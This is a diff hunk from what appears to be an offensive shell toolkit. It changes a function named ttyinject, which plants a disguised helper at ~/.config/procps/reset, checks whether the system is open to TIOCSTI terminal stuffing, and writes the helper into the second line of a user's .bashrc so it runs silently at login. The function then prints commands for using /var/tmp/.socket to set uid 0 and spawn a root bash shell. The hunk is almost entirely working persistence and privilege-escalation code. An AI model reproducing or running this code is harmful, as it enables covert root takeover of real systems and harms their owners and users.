@@ -939,9 +939,11 @@ ttyinject() {
     chmod 755 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; return; }
 
     TTY_TEST=1 "${_HS_HOME_ORIG}/.config/procps/reset" || { ttyinject_clean; HS_WARN "System is not vulnerable to TIOCSTI stuffing."; return; }
-    [ -f "${_HS_HOME_ORIG}/.bashrc" ] && ! grep -qFm1 'procps/reset' "${_HS_HOME_ORIG}/.bashrc" 2>/dev/null && {
-        echo "$(head -n1 "${_HS_HOME_ORIG}/.bashrc")"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 "${_HS_HOME_ORIG}/.bashrc")" >~/.bashrc
-    }
+    if [ -f "${_HS_HOME_ORIG}/.bashrc" ]; then
+        grep -qFm1 'procps/reset' "${_HS_HOME_ORIG}/.bashrc" 2>/dev/null || echo "$(head -n1 "${_HS_HOME_ORIG}/.bashrc")"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 "${_HS_HOME_ORIG}/.bashrc")" >"${_HS_HOME_ORIG}/.bashrc"
+    else
+        echo '~/.config/procps/reset 2>/dev/null' >"${_HS_HOME_ORIG}/.bashrc"
+    fi
     echo -e "Wait for ${CDY}/var/tmp/.socket${CN} to appear and then do:
   ${CDC}"'/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
 }
